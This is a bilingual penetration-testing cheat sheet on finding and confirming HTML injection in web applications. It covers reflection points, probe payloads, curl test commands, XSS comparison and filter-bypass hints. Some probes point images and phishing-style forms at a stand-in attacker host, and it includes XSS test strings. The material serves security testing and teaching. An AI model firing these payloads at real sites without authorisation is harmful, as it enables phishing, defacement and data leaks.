---
aliases:
  - HTML Injection Detection
  - HTML Injection Recon
tags:
  - type/cheatsheet
  - vuln/html-injection
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTML Injection]]'
---
# HTML Injection - Detección y Reconocimiento

***

## Identificar Puntos Reflejados

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Search query | `?q=USER_INPUT` reflejado en results | Standard. |
| Comment / forum post | Body persistido + visible | Stored injection. |
| User profile fields | `name`, `bio`, `signature` | Stored. |
| Error pages | `?id=BAD_INPUT` reflejado en error message | Reflected. |
| URL params reflected | Any `?param=value` que aparezca en page | Standard. |
| Email subjects/body | Email rendered como HTML | Stored. |
| Filename uploads | Filename reflected en gallery | Stored. |
| Custom user fields | App-specific custom inputs | Per app. |
| Headers reflejados | `User-Agent`, `Referer` reflected en page | Common in admin panels. |
| 404 / error pages | Path reflejado en "Not found: <path>" | Easy reflected. |
| Confirmation messages | "Welcome, <name>!" | Stored. |
| Address fields | Shipping addresses display literal | E-commerce. |
| URL preview / OG cards | Generated card incluye HTML | Edge. |
| Print views / PDF | Backend rendering | High impact con LFI. |
| Newsletter / mailing | Email templates con user data | Stored. |
| Notifications | Push notifications with user content | Mobile. |
| Chat messages | Real-time + stored | High visibility. |
^htmli-detect-points

___

## Probes con Tags Básicos

| **Probe** | **Payload** | **Indicador** |
|:---:|:---:|:---:|
| Bold tag | `<b>BOLD</b>` | Texto en negrita = inyección activa. |
| Italic | `<i>italic</i>` | Same. |
| Underline | `<u>underline</u>` | Same. |
| Heading | `<h1>BIG</h1>` | Heading rendered. |
| Image broken | `<img src=x>` | If renders broken image. |
| Image with src | `<img src="https://attacker/log">` | Confirms HTML + outbound. |
| Anchor link | `<a href="https://attacker">click</a>` | Anchor visible + clickable. |
| Line break | `<br>` | Breaks layout = injected. |
| Horizontal rule | `<hr>` | Same. |
| Inline style | `<span style="color:red">x</span>` | Color visible = style applied. |
| Inline form | `<form action="https://attacker">...</form>` | Phishing prep. |
| Confirm reflection | Search response for input verbatim | Standard. |
| Differentiate from XSS | If `<script>` blocked but `<img>` allowed = HTML injection only | Filter check. |
| Probe encoding state | `<` rendered as `&lt;` = escaped (safe) | Detect filter. |
| Marker patterns | `<!--MARKER-->` o `<HTMLINJ>` | Easy grep en response. |
| Length-based | Long HTML triggers different render | Edge. |
| Reflection context | `<input value="USER_INPUT">` (attribute context) | Different injection. |
^htmli-detect-probes

### Probe rápido manual

```bash
# Test bold
curl -s 'https://target/search?q=<b>TEST</b>' | grep -oE '<b>TEST</b>|&lt;b&gt;TEST&lt;/b&gt;'

# Test image with attacker URL (Burp Collaborator)
curl 'https://target/search?q=<img src="https://canary.oast.fun/x">'

# Verify request reaches Collaborator → confirms HTML injection + outbound
```

___

## Diferenciar HTML Injection vs XSS

| **Característica** | **HTML Injection** | **XSS** |
|:---:|:---:|:---:|
| Vector | HTML markup | JavaScript en HTML |
| Tags permitidos | `<b>`, `<i>`, `<img>`, etc | + `<script>`, event handlers |
| Filter scope | Filter solo bloquea `<script>` y events | Filter bloquea más |
| Impact | Phishing, defacement, info leak | Full client compromise |
| CVSS | Lower (Low / Medium) | Higher (High / Critical) |
| Defense | HTML escape (entity encoding) | Same — but more comprehensive |
| Stored vs Reflected | Same categorization | Same |
| Cookie theft | Indirect (via Referer leak) | Direct (`document.cookie`) |
| Persistencia | Defacement, fake forms | Same + script-based persist |
| User interaction | A veces requiere click | Often automatic |
| CSP impact | CSP doesn't stop HTML injection | CSP stops most XSS |
^htmli-detect-vs-xss

### Decision tree

```
Reflection confirmed → ¿qué se renderiza?
  ├─ <b> renders bold → HTML injection at minimum
  │   └─ <script>alert(1)</script> renders → XSS
  │   └─ <img src=x onerror=alert(1)> renders → XSS
  │   └─ Otros tags pasan pero scripts/events filtered → HTML injection only
  └─ <b>TEST</b> shows literal `<b>TEST</b>` → ESCAPED (safe)
```

### Indicadores de filter

| Filter type | Behavior | Próximo paso |
|---|---|---|
| Escape HTML entities | `<` → `&lt;` | Probe specific contexts (attribute, JS, etc). |
| Strip tags | `<b>x</b>` → `x` | Bypass via encoding o nested. |
| Allow whitelist tags | Solo `<b>`, `<i>` permitted | HTML injection limited but possible. |
| CSP active | XSS blocked but HTML inject works | Phishing focus. |
| Encode all | All special chars encoded | Safe — no inj. |
| Sanitize libs (DOMPurify) | Strip scripts + events | XSS hard, HTML injection partial. |
| Markdown render | `[link](url)` allowed → atacante uses MD | Markdown injection variant. |

***
